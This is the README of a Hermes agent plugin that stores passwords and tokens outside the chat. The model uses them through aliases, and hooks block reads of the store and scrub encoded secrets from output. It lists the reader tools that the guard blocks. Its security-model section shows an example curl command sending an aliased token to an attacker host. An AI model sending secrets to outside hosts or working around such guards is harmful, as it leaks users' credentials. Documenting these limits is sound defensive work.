# secret-drop

Give Hermes a password or token without putting the value in the chat, and use it through an alias that only the gateway resolves.

This is a standalone Hermes plugin. It is not part of the Hermes core tree. Install the repository root into `~/.hermes/plugins/`. That is the distribution path described in [CONTRIBUTING.md](https://github.com/NousResearch/hermes-agent/blob/main/CONTRIBUTING.md) and [Build a Hermes Plugin](https://hermes-agent.nousresearch.com/docs/developer-guide/plugins).

## What it does

Hermes Desktop shows a key button beside the composer and a command-palette entry, **Give Hermes a secret**. The masked field sends the value once, over the gateway connection you already use (local backend, remote gateway, or SSH tunnel), to this plugin's API at `/api/plugins/secret-drop/drop`.

On that gateway host the plugin:

1. opens a new owner-only file under `secret-drops/`,
2. writes the secret and reads those same bytes back,
3. saves them in the profile `.env` (mode `0600`) under the name you chose, and checks the read-back,
4. deletes the file.

The response does not contain the value. Nothing is written into the transcript unless you leave **Tell Hermes the variable name** checked. That message names the variable only, for example `$DEPLOY_PASSWORD`. If storing succeeds and the follow-up message fails, the dialog says the secret is stored.

When the dashboard is serving more than one profile, the desktop `profile` query selects which profile receives the value. A request for another profile does not write the launch profile's `.env`.

Custom names are added to the raw `terminal.env_passthrough` list, so later sandboxed commands can expand `$NAME`. That write does not save the defaults-merged config, so `${...}` templates already in `config.yaml` stay templates. Provider and platform credentials such as `OPENAI_API_KEY` or `GITHUB_TOKEN` are stored, but not forwarded into commands and not injectable through an alias.

## Using a secret: `{{secret:NAME}}`

The model never writes the value. It refers to the secret by alias:

```text
curl -H "Authorization: Bearer {{secret:GITHUB_TOKEN}}" https://api.example.test/user
```

A `pre_tool_call` hook replaces every `{{secret:NAME}}` in the `command` of `terminal` and in the `code` of `execute_code` with the stored value, immediately before the call runs. The replacement exists only in the arguments handed to the executor; it is not written back to the assistant message. An unknown name, an empty value, a provider credential, or a malformed alias blocks the call with a message that names the alias as the right way and contains no value.

Direct attempts to read the store are blocked in the same hook:

- `read_file` and `search_files` on `.env`, `secret-drop-names`, or anything under `secret-drops/`,
- `terminal` and `execute_code` text that addresses those paths with a reader (`cat`, `head`, `tail`, `less`, `grep`, `strings`, `awk`, `sed`, `base64`, `hexdump`, `xxd`, `od`, a Python/Perl/Node one-liner with an opening read, and similar).

Output is scrubbed before it reaches the model. `transform_terminal_output` and `transform_tool_result` replace stored values with `«redacted-vault-secret»`, including base64 (standard and URL-safe, padded and unpadded), hex (lower and upper case), URL encoding, the reversed string, and versions split by spaces, dots, or `#`. Only values that pass `registers_for_redaction` are searched: at least 8 characters with a digit or symbol, or at least 24 characters. A short value or a plain word such as `password` is stored but never used as a global search-and-replace, so ordinary text stays intact.

The same guidance is added to the session prompt when Hermes supports plugin prompt sections. The bundled skill `secret-drop:secret-drop` is listed by `skills_list` and is not copied into `~/.hermes/skills/`.

`/secret` in a local terminal asks for the name, then reads the value from a hidden prompt. On Telegram, Discord, and the other messaging platforms, `/secret` stores nothing and does not repeat the argument. Chat is the wrong place for a password.

## Security model — what this does and does not guarantee

This plugin keeps a secret out of the chat transcript, the model prompt, the
conversation history, and the request sent to the model provider.

**What it guarantees:**

- The value is not part of the chat, the model context, or prompt caches. The
  model writes `{{secret:NAME}}`; the gateway substitutes the value only in the
  in-memory tool arguments immediately before execution.
- The value is stored in the profile `.env` with owner-only permissions
  (mode `0600`), and the temporary drop file is deleted after storing.
- Reads of the secret store from `read_file`, `search_files`, `terminal`, and
  `execute_code` are blocked by the `pre_tool_call` guard.
- Stored values and their common encodings are scrubbed from tool output before
  the model sees it.

**What it does NOT guarantee:**

- The model can still *use* a secret it cannot see. A command such as
  `curl -H "Authorization: Bearer {{secret:NAME}}" https://attacker.test` is
  executed by the gateway, and the gateway sends the request. Aliasing protects
  confidentiality in the model context, not the effects of a command.
- A value that no rule recognizes (an encoding outside the list above, a
  substring transformation, a program that re-emits it in a new form) can still
  appear in output.
- The plugin runs inside the gateway process. It is not a boundary against a
  compromised gateway, a modified plugin, or a host-level attacker who can read
  the `.env`.

**Rule of thumb:** trust the alias to keep the value out of prompts, transcripts,
and provider requests. Do not treat it as a sandbox for the effects of commands.

## Limits

The value must be non-empty ASCII, at most 8192 characters, and must not contain a line break or a NUL. Names have to be normal environment variable names. Hermes refuses names that steer a subprocess (`PATH`, `LD_PRELOAD`, `PYTHONPATH`, and the rest of that denylist). The drop route reads its body under a hard 32 KiB cap and rejects larger requests with HTTP 413 before parsing them.

## Layout

`plugin.yaml` sits at the repository root. Hermes then records the allow-list entry as the manifest name `secret-drop`. That is the same string as the dashboard manifest and the desktop plugin id, and it is the path segment in `POST /api/plugins/secret-drop/drop`.

A `plugin.yaml` nested in a subdirectory is recorded as a path key (`hermes-secret-drop/hermes-secret-drop/plugin`). The dashboard gate compares the request path to `plugins.enabled` and does not accept that path key, so the call returns 404 `Plugin not found`.

```
hermes-secret-drop/
├── plugin.yaml                 # name: secret-drop
├── __init__.py                 # /secret, hook registration, session prompt
├── secret_drop.py              # file drop, .env store, wipe
├── secret_guard.py             # alias substitution, read guard, output scrubber
├── skills/secret-drop/SKILL.md
├── dashboard/
│   ├── manifest.json           # name: secret-drop
│   └── plugin_api.py           # POST /api/plugins/secret-drop/drop
└── desktop/
    └── plugin.js               # id: secret-drop, locales included
```

Hermes loads that one file as a script. A second module next to it, including `import './i18n'`, is rejected, and the key button does not register.

The agent half follows `plugins.enabled` and needs a gateway restart so the route and hooks are mounted. The desktop half stays off until its own switch is on.

## Install

Install the repository root, not a subdirectory.

```bash
hermes plugins install Goitonthefloor/hermes-secret-drop
hermes plugins enable secret-drop
```

```text
hermes://plugin/install?repo=Goitonthefloor/hermes-secret-drop
```

`plugins.enabled` must contain `secret-drop`. Remove a path key such as `hermes-secret-drop/hermes-secret-drop/plugin`, and delete a leftover checkout under `~/.hermes/plugins/hermes-secret-drop/` that still has `plugin/plugin.yaml` inside it. Restart the gateway after enabling.

In Hermes Desktop, turn on **Secret drop** under **Capabilities → Plugins**. The key sits in the composer, to the left of the model pill.

A catalog entry is a separate reviewed pull request in `NousResearch/hermes-agent` `plugin-catalog/`, pinned to an exact commit of this repo. Do not add this plugin to the Hermes core tree.

## Tests

From this directory, with the Hermes checkout importable:

```bash
PYTHONPATH=/path/to/hermes-agent python -m pytest tests/ -q
```
